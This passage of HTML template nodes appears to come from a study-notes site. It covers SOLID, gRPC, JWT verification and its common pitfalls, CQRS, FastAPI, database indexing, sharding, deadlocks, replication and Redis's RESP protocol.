<template id="node-05-02" data-type="node" data-trail="trail-05" data-order="2"
  data-title="SOLID Principles"
  data-file="SOLID.md"
  data-bridge="With SOLID's principle of separation in mind, you're ready for the first inter-service communication pattern: RPC treats a remote function call like a local one, and gRPC pushes that idea to its performant extreme.">
<h3>S — Single Responsibility</h3>
<div class="compare">
  <div><h4>Before</h4><pre>class Order:
    add_item()
    total_price()
    pay(type, code) ← WRONG</pre></div>
  <div><h4>After</h4><pre>class Order:     ← data only
    add_item()
    total_price()
class PaymentProcessor: ← payments
    pay_debit(order, code)
    pay_credit(order, code)</pre></div>
</div>
<h3>O — Open / Closed</h3>
<div class="compare">
  <div><h4>Violates OCP</h4><pre>def pay(type, code):
    if type == "debit": ...
    elif type == "credit": ...
    # add Bitcoin? edit this! ✗</pre></div>
  <div><h4>Satisfies OCP</h4><pre>class PaymentProcessor(ABC):
    @abstractmethod
    def pay(order): ...
class DebitPaymentProcessor(PaymentProcessor):
    def pay(order): ...
# Add Bitcoin = add new class ✓</pre></div>
</div>
<h3>L — Liskov Substitution</h3>
<p>Subtypes must be substitutable for their base type. Fix: move credentials to <code>__init__</code>, keep <code>pay(order)</code> signature consistent across all subclasses.</p>
<h3>I — Interface Segregation (via Composition)</h3>
<pre>
  class SMSAuthorizer:       ← separate concern
      def verify_code(code): ...
      def is_authorized(): bool

  class DebitPaymentProcessor:
      def __init__(self, code, authorizer):
      def pay(order):
          assert authorizer.is_authorized()
          # process debit ✓

  CreditPaymentProcessor never has to implement SMS methods it doesn't support.</pre>
<h3>D — Dependency Inversion</h3>
<pre>
  class Authorizer(ABC):     ← abstraction
      @abstractmethod
      def authorize(): ...

  class SMSAuthorizer(Authorizer):     ...
  class NotARobotAuthorizer(Authorizer): ...

  PaymentProcessor receives any Authorizer.
  Switch auth method = swap the dependency, touch nothing else. ✓</pre>
<div class="info">Prefer <strong>composition over inheritance</strong> — passing <code>SMSAuthorizer</code> into <code>PaymentProcessor</code> is cleaner than <code>class SMSPaymentProcessor(PaymentProcessor)</code>.</div>
</template>

<template id="node-05-03" data-type="node" data-trail="trail-05" data-order="3"
  data-title="RPC"
  data-file="RPC.md"
  data-bridge="RPC establishes the concept; gRPC is its production-grade implementation — Protobuf serialization, HTTP/2 multiplexing, and streaming built for high-throughput microservices.">
<h3>What RPC Means</h3>
<div class="compare">
  <div><h4>Local call</h4><pre>result = my_function(args)
No network, instant,
never fails.</pre></div>
  <div><h4>Remote Procedure Call</h4><pre>result = remote_function(args)
1. args serialised
2. network request sent
3. remote server executes
4. response deserialised
Same syntax, very different risks.</pre></div>
</div>
<div class="warn">Risk: pretending a remote call is local. Network calls have latency, timeouts, and partial failure modes that local calls never have.</div>
<h3>Lambda (RPC-style) vs gRPC</h3>
<table>
  <thead><tr><th></th><th>Lambda</th><th>gRPC</th></tr></thead>
  <tbody>
    <tr><td>Infrastructure</td><td>Fully managed (serverless)</td><td>Self-managed</td></tr>
    <tr><td>Protocol</td><td>HTTP / HTTPS</td><td>HTTP/2</td></tr>
    <tr><td>Serialisation</td><td>JSON (text)</td><td>Protocol Buffers (binary)</td></tr>
    <tr><td>Latency</td><td>Higher (cold starts)</td><td>Lower (persistent connections)</td></tr>
    <tr><td>Streaming</td><td>Not supported</td><td>Client, server, bidirectional</td></tr>
    <tr><td>Best for</td><td>Event-driven, low-traffic</td><td>High-performance microservices</td></tr>
  </tbody>
</table>
</template>

<template id="node-05-04" data-type="node" data-trail="trail-05" data-order="4"
  data-title="gRPC"
  data-file="GRPC.md"
  data-bridge="Inter-service communication raises an immediate question: how do services verify identity? JWT answers it with stateless, self-contained tokens that work across any protocol.">
<h3>gRPC vs REST</h3>
<table>
  <thead><tr><th></th><th>REST</th><th>gRPC</th></tr></thead>
  <tbody>
    <tr><td>Format</td><td>JSON (text)</td><td>Protocol Buffers (binary)</td></tr>
    <tr><td>Transport</td><td>HTTP/1.1 — one req per connection</td><td>HTTP/2 — multiplex many on one TCP</td></tr>
    <tr><td>Schema</td><td>Loose (any valid JSON)</td><td>Strict (.proto file)</td></tr>
    <tr><td>Payload size</td><td><code>{"name":"Alice","age":30}</code> = 28 bytes</td><td>Binary equivalent ≈ 7 bytes</td></tr>
    <tr><td>Browser-friendly</td><td>Yes</td><td>No (needs grpc-web proxy)</td></tr>
  </tbody>
</table>
<h3>HTTP/2 Multiplexing</h3>
<div class="compare">
  <div><h4>HTTP/1.1</h4><pre>Connection 1: req1 → resp1
Connection 2: req2 → resp2
Connection 3: req3 → resp3
3 TCP handshakes</pre></div>
  <div><h4>HTTP/2 (gRPC)</h4><pre>One connection:
  stream 1: req1 ──► resp1
  stream 3: req2 ──► resp2
  stream 5: req3 ──► resp3
1 handshake → all calls free</pre></div>
</div>
<h3>Four Streaming Modes</h3>
<table>
  <thead><tr><th>Mode</th><th>Direction</th><th>Use case</th></tr></thead>
  <tbody>
    <tr><td>Unary</td><td>1 req → 1 resp</td><td>Regular request-response</td></tr>
    <tr><td>Server streaming</td><td>1 req → stream</td><td>Live feed, log tail</td></tr>
    <tr><td>Client streaming</td><td>stream → 1 resp</td><td>File upload, batch ingest</td></tr>
    <tr><td>Bidirectional</td><td>both stream</td><td>Chat, real-time collaboration</td></tr>
  </tbody>
</table>
</template>

<template id="node-05-05" data-type="node" data-trail="trail-05" data-order="5"
  data-title="JWT"
  data-file="JWT.md"
  data-bridge="Authentication establishes who. As systems scale, the bigger challenge is how they read and write data. CQRS separates those two concerns entirely, and Event Sourcing makes every state change an auditable, replayable fact.">
<h3>JWT Structure</h3>
<pre>
  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
  .eyJzdWIiOiJ1c2VyXzEyMyIsImlhdCI6MTcxNjc2ODAwMH0
  .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

  ─────────────┬──────────────────────────────────────────
  HEADER       │ Base64url({ "alg": "RS256", "typ": "JWT" })
  ─────────────┼──────────────────────────────────────────
  PAYLOAD      │ Base64url({ "sub": "user_123",
               │             "iat": 1716768000,
               │             "exp": 1716854400 })
  ─────────────┼──────────────────────────────────────────
  SIGNATURE    │ RS256(Base64(header)+"."+Base64(payload), private_key)
  ─────────────┴──────────────────────────────────────────

  Header + Payload: BASE64 — anyone can decode and read.
  Signature: CRYPTOGRAPHIC — only server with private key can produce it.</pre>
<h3>Verification Flow</h3>
<pre>
  Client sends: Authorization: Bearer eyJhbGci...

  Server:
    1. Split at "." → header_b64, payload_b64, signature
    2. Decode header → find algorithm ("RS256")
    3. Recompute: RS256(header_b64+"."+payload_b64, public_key)
    4. Compare recomputed vs token signature
    5. Check exp &gt; now
    6. Both pass → valid ✓  else → 401 ✗</pre>
<h3>Security Pitfalls</h3>
<table>
  <thead><tr><th>Vulnerability</th><th>What happens</th><th>Prevention</th></tr></thead>
  <tbody>
    <tr><td>Algorithm confusion</td><td>Attacker changes <code>alg</code> to <code>none</code></td><td>Always verify <code>alg</code> explicitly; reject <code>none</code></td></tr>
    <tr><td>Weak secret</td><td>HS256 short secret is brute-forceable</td><td>Use RS256 or long random secret</td></tr>
    <tr><td>Long expiry</td><td>Stolen token valid for days</td><td>Short expiry (15 min) + refresh token</td></tr>
    <tr><td>PII in payload</td><td>Payload is readable by anyone</td><td>Never put passwords or sensitive data</td></tr>
  </tbody>
</table>
</template>

<template id="node-05-06" data-type="node" data-trail="trail-05" data-order="6"
  data-title="CQRS and Event Sourcing"
  data-file="CQRS.md"
  data-bridge="CQRS shows what advanced architecture looks like; FastAPI and Django are the frameworks you choose between before you get there — this note grounds that choice in the architectural trade-offs you now understand.">
<h3>Event Sourcing: State from an Immutable Log</h3>
<div class="compare">
  <div><h4>Traditional DB</h4><pre>products table
┌────┬──────┬───────┐
│ id │ name │ price │
│  1 │ Shoe │ 120   │
└────┴──────┴───────┘
Only current state.
Past states lost.</pre></div>
  <div><h4>Event Sourcing</h4><pre>events (append-only)
┌────┬──────────────────┐
│  1 │ ProductCreated 100│
│  2 │ PriceUpdated   110│
│  3 │ PriceUpdated   120│
└────┴──────────────────┘
Replay → price=120 ✓
Replay 1-2 → price=110 ✓</pre></div>
</div>
<h3>CQRS Architecture</h3>
<pre>
  ┌──────────────────────────────────────────────────────────────┐
  │                         CLIENT                               │
  └──────────────┬───────────────────────────┬───────────────────┘
                 │ Command                   │ Query
                 ▼                           ▼
  ┌──────────────────────────┐  ┌─────────────────────────────┐
  │      COMMAND SIDE         │  │        QUERY SIDE            │
  │  Validate business rules  │  │  Read from materialised view │
  │  Append event to store    │  │  (read-optimised DB)         │
  └────────────┬──────────────┘  └─────────────────────────────┘
               │ events via Kafka/RabbitMQ          ▲
               └────────────────────────────────────┘</pre>
<h3>Snapshots</h3>
<pre>
  Without: replay event 1 → 2 → ... → 10,000 (slow)
  With:    load snapshot @ event 9,900
             ↓ replay only 100 events ✓</pre>
<ul>
  <li><strong>Sourcing</strong>: truth = event log; <strong>Hydration</strong>: rebuild one entity; <strong>Replay</strong>: reprocess all events</li>
  <li>Perfect audit trail — who changed what, when, to what value, forever</li>
  <li>Materialized views updated incrementally as events arrive</li>
</ul>
<h3>Industry Use Cases</h3>
<table>
  <thead><tr><th>Industry</th><th>Commands (write side)</th><th>Read side materialized views</th><th>Primary driver</th></tr></thead>
  <tbody>
    <tr><td>E-commerce</td><td>PlaceOrder, UpdateInventory</td><td>Catalog pages, order history</td><td>Asymmetric read/write traffic</td></tr>
    <tr><td>Finance / Banking</td><td>MoneyDebited, TransferReversed</td><td>Balances, statements, dashboards</td><td>Audit trail compliance</td></tr>
    <tr><td>Ride-sharing</td><td>RequestRide, CompleteTrip</td><td>Driver locations, surge pricing</td><td>100x more reads than writes</td></tr>
    <tr><td>Healthcare</td><td>RecordVisit, PrescribeMed</td><td>Patient chart (snapshot-backed)</td><td>Legal audit requirement</td></tr>
    <tr><td>SaaS / CRM</td><td>CloseDeal, UpdatePipeline</td><td>Revenue dashboards, deal views</td><td>Multiple read models from one stream</td></tr>
    <tr><td>Gaming</td><td>SubmitScore, CompleteMatch</td><td>Leaderboards, player history</td><td>High fan-out, fast reads</td></tr>
  </tbody>
</table>
<div class="info">Adopt CQRS when: read/write traffic is asymmetric, audit trails are required by compliance, multiple read models are needed from the same data, or write business rules are complex while reads are simple.</div>
</template>

<template id="node-05-07" data-type="node" data-trail="trail-05" data-order="7"
  data-title="FastAPI vs Django"
  data-file="FastAPI/Fast API (vs Django).md"
  data-bridge="FastAPI's key architectural feature is its dependency injection system. This note covers Depends in depth — how it wires authentication, database sessions, and shared logic as first-class language features.">
<h3>Framework Comparison</h3>
<table>
  <thead><tr><th></th><th>Django</th><th>Flask</th><th>FastAPI</th></tr></thead>
  <tbody>
    <tr><td>Type</td><td>Full-stack</td><td>Micro-framework</td><td>API-centric</td></tr>
    <tr><td>ORM</td><td>Yes (built-in)</td><td>No</td><td>No</td></tr>
    <tr><td>Admin panel</td><td>Yes</td><td>No</td><td>No</td></tr>
    <tr><td>Async support</td><td>Partial</td><td>None</td><td>Native</td></tr>
    <tr><td>Validation</td><td>Forms</td><td>Manual</td><td>Pydantic ✓</td></tr>
    <tr><td>Auto API docs</td><td>No</td><td>No</td><td>Swagger + ReDoc ✓</td></tr>
  </tbody>
</table>
<h3>The <code>yield</code> Pattern — Dependency Cleanup</h3>
<div class="compare">
  <div><h4>Regular return</h4><pre>def get_items():
    return [1, 2, 3]
# returns all at once</pre></div>
  <div><h4>yield for cleanup</h4><pre>def get_db():
    db = Session()
    try:
        yield db  ← pauses here
    finally:
        db.close() ← runs on exit</pre></div>
</div>
<h3>When to Choose</h3>
<div class="compare">
  <div><h4>Choose Django when</h4><ul><li>Full web app with auth, forms, admin</li><li>Mature ORM with migrations</li><li>Server-rendered HTML</li><li>Batteries-included approach</li></ul></div>
  <div><h4>Choose FastAPI when</h4><ul><li>REST/JSON API or microservice</li><li>High-concurrency I/O endpoints</li><li>Auto validation via type hints</li><li>Auto-generated Swagger docs</li><li>Python ML/data ecosystem</li></ul></div>
</div>
</template>

<template id="node-05-08" data-type="node" data-trail="trail-05" data-order="8"
  data-title="FastAPI Dependency Injection"
  data-file="FastAPI/FastAPI Dependency Injection (Depends) - Comprehen.md"
  data-bridge="">
<h3>The Execution Flow</h3>
<pre>
  HTTP Request arrives
         │
         ▼
  ┌────────────────────────────────┐
  │  1. Route matching             │
  └────────────────────┬───────────┘
                       ↓
  ┌────────────────────────────────┐
  │  2. Check router dependencies  │
  │     Depends(verify_token)      │
  └────────────────────┬───────────┘
                       ↓
  ┌────────────────────────────────┐
  │  3. Execute dependency         │
  │     extract headers            │
  │     validate JWT, check roles  │
  └────────────┬──────────┬────────┘
               │          │
            ✓ pass     ✗ fail
               │          └─► HTTPException 401/403
               │              ENDPOINT NEVER RUNS
               ↓
  ┌────────────────────────────────┐
  │  4. Resolve endpoint params    │
  │     Query(), Body(), Path()    │
  └────────────────────┬───────────┘
                       ↓
  ┌────────────────────────────────┐
  │  5. Run endpoint function      │
  └────────────────────────────────┘</pre>
<h3>Parameter Sources</h3>
<table>
  <thead><tr><th>Type</th><th>Extracts from</th><th>Example</th></tr></thead>
  <tbody>
    <tr><td><code>Query(default)</code></td><td>URL query string</td><td><code>?format=json&amp;page=2</code></td></tr>
    <tr><td><code>Body(default)</code></td><td>Request body (JSON)</td><td><code>{"name": "Alice"}</code></td></tr>
    <tr><td><code>Header(default)</code></td><td>HTTP headers</td><td><code>Authorization: Bearer ...</code></td></tr>
    <tr><td><code>Path()</code></td><td>URL path segment</td><td><code>/users/{user_id}</code></td></tr>
  </tbody>
</table>
<h3>Dependency Chains</h3>
<pre>
  get_token(header) → get_user(token) → get_permissions(user) → endpoint(perms)

  async def get_token(x: str = Header(...)): return x
  async def get_user(t = Depends(get_token)): return jwt.decode(t, ...)
  async def get_perms(u = Depends(get_user)): return db.find(u['id'])

  @router.get("/admin")
  async def admin(perms = Depends(get_perms)):
      # FastAPI ran: get_token → get_user → get_perms → this</pre>
<h3>Benefits</h3>
<table>
  <thead><tr><th>Benefit</th><th>How</th></tr></thead>
  <tbody>
    <tr><td>Testability</td><td><code>app.dependency_overrides[get_db] = lambda: MockDB()</code></td></tr>
    <tr><td>DRY</td><td>Auth/DB/pagination written once, reused everywhere</td></tr>
    <tr><td>Consistent security</td><td><code>router.dependencies = [Depends(auth)]</code> protects all routes</td></tr>
    <tr><td>Performance</td><td><code>@lru_cache()</code> on dep = computed once, cached for process lifetime</td></tr>
  </tbody>
</table>
</template>

<template id="node-06-01" data-type="node" data-trail="trail-06" data-order="1"
  data-title="SQL vs NoSQL: Trade-offs"
  data-file="Database/SQL vs NoSQL - Tradeoffs.md"
  data-bridge="With the fundamental storage choice made, the next most impactful performance lever is indexing — the data structure that lets the query planner skip full table scans.">
<h3>The CAP Theorem</h3>
<pre>
  You can only guarantee TWO of three simultaneously:

              Consistency
                  △
                 / \
                /   \
  Availability ─────── Partition Tolerance

  CA: impossible in distributed systems (partitions always happen)
  CP: HBase, Zookeeper, MongoDB (strict mode)
  AP: Cassandra, CouchDB, DynamoDB</pre>
<div class="compare">
  <div><h4>SQL (Relational)</h4><ul><li>Tables + rows + strict schema</li><li>JOINs across tables</li><li>ACID transactions built-in</li><li>Scales vertically first</li><li>Standard SQL</li><li>Manual sharding + replication</li></ul></div>
  <div><h4>NoSQL</h4><ul><li>Documents, key-value, graph, column</li><li>Denormalised, no joins</li><li>Eventual consistency (often)</li><li>Scales horizontally natively</li><li>Each DB has own query API</li><li>Sharding + replication built-in</li></ul></div>
</div>
<h3>When to Choose</h3>
<table>
  <thead><tr><th>Use SQL when</th><th>Use NoSQL when</th></tr></thead>
  <tbody>
    <tr><td>Data has clear relational structure</td><td>Schema is flexible or evolving</td></tr>
    <tr><td>JOINs across entities needed</td><td>Horizontal scaling is the priority</td></tr>
    <tr><td>ACID transactions required</td><td>Write throughput is the bottleneck</td></tr>
    <tr><td>Simpler project or existing SQL infra</td><td>Data model is document/graph shaped</td></tr>
  </tbody>
</table>
<div class="warn">NoSQL adds operational complexity and cost for small projects — SQL is often cheaper and simpler until you genuinely need the scale.</div>
</template>

<template id="node-06-02" data-type="node" data-trail="trail-06" data-order="2"
  data-title="DB Indexing"
  data-file="Database/DB Indexing.md"
  data-bridge="Indexing optimizes queries within a single machine. When that machine's limits are hit, sharding distributes data across many — this note covers the strategies and trade-offs of horizontal partitioning.">
<h3>Index as Library Catalog</h3>
<div class="compare">
  <div><h4>Without index</h4><pre>SELECT * FROM users
WHERE email = 'x@y.com'
Full table scan: O(n)
10M rows = 10M reads
~300ms</pre></div>
  <div><h4>With index on email</h4><pre>B-tree lookup: O(log n)
"x@y.com" → row 847
Jump directly to row
~1ms ✓</pre></div>
</div>
<h3>Index Types (DDIA)</h3>
<table>
  <thead><tr><th>Type</th><th>Structure</th><th>Extra lookup?</th></tr></thead>
  <tbody>
    <tr><td>Heap file index</td><td>B-tree → pointer to row</td><td>Yes (two reads)</td></tr>
    <tr><td>Clustered index</td><td>B-tree; row data IS the leaf</td><td>No (one read)</td></tr>
    <tr><td>Covering index</td><td>B-tree; includes extra columns</td><td>No (for covered queries)</td></tr>
  </tbody>
</table>
<div class="info">MySQL InnoDB: primary key is always a <strong>clustered index</strong> — the data IS the B-tree leaf.</div>
<h3>When to Index — and When Not To</h3>
<div class="compare">
  <div><h4>Index these ✓</h4><ul><li>Frequent <code>WHERE</code> / <code>JOIN</code> / <code>ORDER BY</code></li><li>Unique identifiers (email, uuid)</li><li>Foreign keys</li></ul></div>
  <div><h4>Skip these ✗</h4><ul><li>Low-cardinality columns (gender, status)</li><li>Frequently updated columns (last_login)</li><li>Small tables (full scan is fine)</li></ul></div>
</div>
<h3>OLTP vs OLAP</h3>
<table>
  <thead><tr><th></th><th>OLTP</th><th>OLAP</th></tr></thead>
  <tbody>
    <tr><td>Pattern</td><td>Many small reads + writes</td><td>Few large aggregation scans</td></tr>
    <tr><td>Storage</td><td>Row-oriented</td><td>Column-oriented</td></tr>
    <tr><td>Index benefit</td><td>High (key lookups)</td><td>Low (scans all rows anyway)</td></tr>
  </tbody>
</table>
</template>

<template id="node-06-03" data-type="node" data-trail="trail-06" data-order="3"
  data-title="DB Sharding"
  data-file="Database/DB Sharding.md"
  data-bridge="Sharding distributes data; deadlocks show what happens when concurrent transactions compete for the same rows. This note covers how circular waits form and the two SQL patterns that prevent them.">
<h3>The Problem Sharding Solves</h3>
<div class="compare">
  <div><h4>Single server (maxed out)</h4><pre>┌───────────────────┐
│     Database      │
│  users 1–100M     │
│  (one machine)    │
└───────────────────┘</pre></div>
  <div><h4>After sharding</h4><pre>┌──────────┐ ┌──────────┐ ┌──────────┐
│ Shard 1  │ │ Shard 2  │ │ Shard 3  │
│ 1–33M    │ │ 33M–66M  │ │ 66M–100M │
└──────────┘ └──────────┘ └──────────┘
Each = independent DB server ✓</pre></div>
</div>
<h3>Three Sharding Strategies</h3>
<table>
  <thead><tr><th>Strategy</th><th>How</th><th>Pro</th><th>Con</th></tr></thead>
  <tbody>
    <tr><td>Range</td><td>user_id 1–1M → Shard A</td><td>Range queries easy</td><td>Hot spots (sequential IDs)</td></tr>
    <tr><td>Hash</td><td>hash(user_id) % N</td><td>Even distribution</td><td>Range queries hit all shards</td></tr>
    <tr><td>Directory</td><td>Lookup table: key → shard</td><td>Flexible remapping</td><td>Lookup = bottleneck + SPOF</td></tr>
  </tbody>
</table>
<h3>Trade-offs</h3>
<table>
  <thead><tr><th>Benefit</th><th>Cost</th></tr></thead>
  <tbody>
    <tr><td>Scale beyond single machine</td><td>Cross-shard JOINs require app-level joins</td></tr>
    <tr><td>Distribute write load</td><td>Transactions spanning shards are very complex</td></tr>
    <tr><td>Fault isolation per shard</td><td>Rebalancing when adding/removing nodes is expensive</td></tr>
  </tbody>
</table>
<div class="warn">Avoid sharding until necessary — try vertical scaling, read replicas, and caching first. Once sharded, cross-shard foreign key constraints and unique constraints no longer work.</div>
</template>

<template id="node-06-04" data-type="node" data-trail="trail-06" data-order="4"
  data-title="DB Deadlocks"
  data-file="Database/DB Deadlocks.md"
  data-bridge="Kleppmann's DDIA provides the theoretical underpinning for everything above — reliability, scalability, storage engine internals, and encoding formats — making the previous three notes feel like derived consequences.">
<h3>What a Deadlock Looks Like</h3>
<pre>
  Transaction A                Transaction B
  ─────────────────────────    ─────────────────────────
  BEGIN;                       BEGIN;
  UPDATE accounts SET ...
    WHERE id=1;  ← locks row 1   UPDATE accounts SET ...
                                   WHERE id=2;  ← locks row 2

  UPDATE accounts SET ...      UPDATE accounts SET ...
    WHERE id=2;  ← WAIT!         WHERE id=1;  ← WAIT!

  A waits for B. B waits for A. Neither can proceed.
  DB detects the cycle → aborts one transaction → application must RETRY.</pre>
<h3>Prevention: Strategy 1 — Same Order Access</h3>
<div class="compare">
  <div><h4>Deadlock-prone</h4><pre>T_A: lock row 1 → lock row 2
T_B: lock row 2 → lock row 1
Circular wait possible ✗</pre></div>
  <div><h4>Deadlock-free</h4><pre>Both: always lock id=1 first,
       then id=2
No cycle possible ✓</pre></div>
</div>
<h3>Prevention: Strategy 2 — Acquire All Locks Upfront</h3>
<pre>
  SELECT id, balance FROM accounts
  WHERE id IN (1, 2)
  FOR UPDATE;  ← locks BOTH rows at once before any update

  No other transaction can modify either row
  until this transaction commits. ✓</pre>
<ul>
  <li>Database detects cycles via wait-for graph; aborts the "victim" transaction</li>
  <li>Application <strong>must</strong> implement retry logic for deadlock errors</li>
  <li>Common cause: code accessing multiple rows/tables in inconsistent order</li>
  <li><code>FOR UPDATE</code> = pessimistic locking — assumes conflicts will happen</li>
</ul>
</template>

<template id="node-06-05" data-type="node" data-trail="trail-06" data-order="5"
  data-title="DDIA Part 1: Foundations of Data Systems"
  data-file="DDIA/Part 1 Foundation of data systems.md"
  data-bridge="DDIA Chapter 5 extends the storage foundation to distributed machines: how to keep multiple copies of data consistent, and the fundamental trade-offs between single-leader, multi-leader, and leaderless replication.">
<h3>Three Design Goals</h3>
<pre>
  RELIABILITY:     continues working correctly despite faults
                   (hardware, software, human error)

  SCALABILITY:     copes with increased load
                   measure with load parameters + response time percentiles
                   (p95, p99 — not averages; the worst 1% still matters)

  MAINTAINABILITY: easy for people to work on over time
                   Operability | Simplicity | Evolvability</pre>
<h3>Relational vs Document Models</h3>
<div class="compare">
  <div><h4>Relational</h4><ul><li>Tables + rows, typed columns</li><li>Normalise: store once, reference by FK</li><li>Declarative SQL: you say WHAT</li><li>Good for: many-to-many, JOINs, ACID</li></ul></div>
  <div><h4>Document</h4><ul><li>Nested JSON, flexible schema</li><li>Denormalise: embed related data</li><li>Imperative: you say HOW</li><li>Good for: tree-shaped, loaded all-at-once</li></ul></div>
</div>
<h3>Column-Oriented Storage + Bitmap Encoding</h3>
<pre>
  ROW-ORIENTED:                     COLUMN-ORIENTED:
  Row 1: id=1, name=Alice, age=30   age column = [30, 25, 28, ...]
  Row 2: id=2, name=Bob,   age=25   (one contiguous file per column)

  Reading age requires skipping      Reading age reads NOTHING else
  over id + name data each row.      → fast aggregates (OLAP) ✓

  BITMAP ENCODING:
  country="US": [1, 0, 1, 0, 1]  (bit per row)
  active=true:  [1, 1, 0, 1, 0]
  WHERE country='US' AND active: CPU bitwise AND → instant result</pre>
<h3>Data Encoding Formats</h3>
<table>
  <thead><tr><th>Format</th><th>Schema?</th><th>Binary?</th><th>Backward compatible?</th></tr></thead>
  <tbody>
    <tr><td>JSON / XML</td><td>No</td><td>No (text)</td><td>Manually</td></tr>
    <tr><td>Protocol Buffers</td><td>Yes (.proto)</td><td>Yes</td><td>Yes (field tags)</td></tr>
    <tr><td>Avro</td><td>Yes</td><td>Yes</td><td>Yes (schema in file)</td></tr>
    <tr><td>Thrift</td><td>Yes (.thrift)</td><td>Yes</td><td>Yes (field IDs)</td></tr>
  </tbody>
</table>
</template>

<template id="node-06-06" data-type="node" data-trail="trail-06" data-order="6"
  data-title="DDIA Replication"
  data-file="DDIA/Replication.md"
  data-bridge="Replication is about data across machines. Redis shows what happens when you push a single-machine store to its performance ceiling — IO multiplexing achieves enormous throughput on a single thread with no locking overhead.">
<h3>Single-Leader Replication</h3>
<pre>
  Clients
  Writes ───────────────► LEADER ──replication log──► Follower 1
  Reads ────────────────►│                 └──────────► Follower 2
    (or to any follower)  │                 └──────────► Follower 3

  ALL writes go to leader. Reads from leader or followers.</pre>
<table>
  <thead><tr><th></th><th>Synchronous</th><th>Asynchronous</th></tr></thead>
  <tbody>
    <tr><td>Leader behaviour</td><td>Waits for follower ACK before confirming</td><td>Confirms immediately</td></tr>
    <tr><td>Durability</td><td>Follower guaranteed up-to-date</td><td>Data can be lost if leader fails</td></tr>
    <tr><td>Availability</td><td>One slow follower blocks ALL writes</td><td>Leader never blocked</td></tr>
  </tbody>
</table>
<div class="info"><strong>Semi-synchronous</strong> (practical default): 1 sync follower + rest async. Guarantees data on ≥2 nodes without blocking on all followers.</div>
<h3>Replication Lag Anomalies</h3>
<pre>
  READ-YOUR-WRITES:
  User posts → write to leader → reads stale follower → post appears lost ✗
  Fix: read user's own data from leader; others from followers.

  MONOTONIC READS:
  User reads comment from fresh replica → refreshes → hits stale replica
  → comment disappears (time goes backwards) ✗
  Fix: route each user consistently to the same replica.

  CONSISTENT PREFIX READS:
  Answer arrives before question (different replicas, different speeds) ✗
  Fix: write causally related data to the same partition.</pre>
<h3>Leaderless Replication (Dynamo-style)</h3>
<pre>
  QUORUM: w + r &gt; n  (write nodes + read nodes &gt; total replicas)

  n=3, w=2, r=2:
  ┌──────────┐  ┌──────────┐  ┌──────────┐
  │ v=5 ✓   │  │ v=5 ✓   │  │ v=4 ✗   │  ← stale
  └──────────┘  └──────────┘  └──────────┘
  Client reads from all 3, picks highest version → v=5 ✓
  Read repair: writes v=5 back to stale replica</pre>
<h3>Consistency Spectrum</h3>
<pre>
  Weak ◄──────────────────────────────────────────────────► Strong

  Eventual    Monotonic    Read-your-   Consistent    Strong /
  consistency  reads        writes      prefix reads  Linearisable</pre>
</template>

<template id="node-06-07" data-type="node" data-trail="trail-06" data-order="7"
  data-title="Redis Internals"
  data-file="Redis/Redis Internals.md"
  data-bridge="One layer below the Redis API is RESP — its wire protocol. Understanding why Redis chose a custom binary-safe format over JSON reveals how protocol design decisions translate directly to performance.">
<h3>Multi-Threading vs IO Multiplexing</h3>
<div class="compare">
  <div><h4>Multi-threaded server</h4><pre>Client A → Thread 1 (needs lock)
Client B → Thread 2 (BLOCKED)
Client C → Thread 3 (BLOCKED)
Lock contention + context switching
+ race conditions overhead</pre></div>
  <div><h4>Redis: IO multiplexing</h4><pre>Thousands of clients connect
        │
Single event loop thread:
  1. Ask OS: which sockets ready?
  2. OS: "sockets 1, 4, 7 are ready"
  3. Execute commands in sequence
  4. Back to step 1
No locks. No switching. ✓</pre></div>
</div>
<div class="info">The restaurant analogy: <strong>blocking IO</strong> = waiter stands at one table waiting to order. <strong>IO multiplexing</strong> = waiter watches the whole room, only goes to a table when a customer raises their hand.</div>
<h3>Why Single-Threaded Redis Is Fast</h3>
<pre>
  Network IO is SLOW (milliseconds)
  Memory operations are FAST (microseconds)

  While "waiting" for network data:
  → Multi-threaded server: threads sit blocked
  → Redis: processes thousands of other READY commands from memory

  No locking overhead. No context switching.
  Exploits network latency to maximise memory throughput.</pre>
<h3>Redis Feature Summary</h3>
<table>
  <thead><tr><th>Feature</th><th>How it works</th></tr></thead>
  <tbody>
    <tr><td>Atomicity</td><td>Single-threaded; no command can interrupt another</td></tr>
    <tr><td>Persistence</td><td>AOF (Append Only File) logs every write; RDB periodic snapshots</td></tr>
    <tr><td>TTL</td><td>Keys expire automatically; eviction strategies (LRU, LFU) handle full memory</td></tr>
    <tr><td>Transactions</td><td><code>MULTI</code>/<code>EXEC</code> queues commands; executes atomically (no rollback)</td></tr>
    <tr><td>Data structures</td><td>Strings, hashes, lists, sets, sorted sets, bitmaps, HyperLogLog</td></tr>
  </tbody>
</table>
</template>

<template id="node-06-08" data-type="node" data-trail="trail-06" data-order="8"
  data-title="Wire Protocols: RESP"
  data-file="Redis/Wire Protocols - RESP.md"
  data-bridge="After reading about IO multiplexing and wire protocols, building a raw TCP echo server closes the loop. Once you've implemented the blocking bottleneck yourself, Redis's architecture stops being abstract.">
<h3>Why Not JSON?</h3>
<div class="compare">
  <div><h4>JSON parsing</h4><pre>{"name":"Alice","age":30}
Parser must scan for:
{ } [ ] " : ,
handle escapes
determine types
CPU-intensive</pre></div>
  <div><h4>RESP parsing</h4><pre>$5\r\nAlice\r\n:30\r\n
Read prefix → type + length
Read exactly N bytes → done
Minimal CPU ✓</pre></div>
</div>
<h3>RESP Data Types</h3>
<table>
  <thead><tr><th>Type</th><th>Prefix</th><th>Format</th><th>Example</th></tr></thead>
  <tbody>
    <tr><td>Simple string</td><td><code>+</code></td><td><code>+text\r\n</code></td><td><code>+OK\r\n</code></td></tr>
    <tr><td>Integer</td><td><code>:</code></td><td><code>:number\r\n</code></td><td><code>:1729\r\n</code></td></tr>
    <tr><td>Bulk string</td><td><code>$</code></td><td><code>$len\r\ndata\r\n</code></td><td><code>$5\r\nhello\r\n</code></td></tr>
    <tr><td>Array</td><td><code>*</code></td><td><code>*count\r\n…elements</code></td><td><code>*2\r\n$3\r\nGET\r\n…</code></td></tr>
    <tr><td>Error</td><td><code>-</code></td><td><code>-message\r\n</code></td><td><code>-ERR unknown\r\n</code></td></tr>
  </tbody>
</table>
<h3>Bulk Strings: The Key Design</h3>
<pre>
  $5\r\nhello\r\n

  $5     → "the data is exactly 5 bytes"
  \r\n   → end of length line
  hello  → exactly 5 bytes read (regardless of content)
  \r\n   → end of data marker

  Binary safe: data can contain ANY byte including \r\n.
  The length prefix tells the parser exactly when to stop.
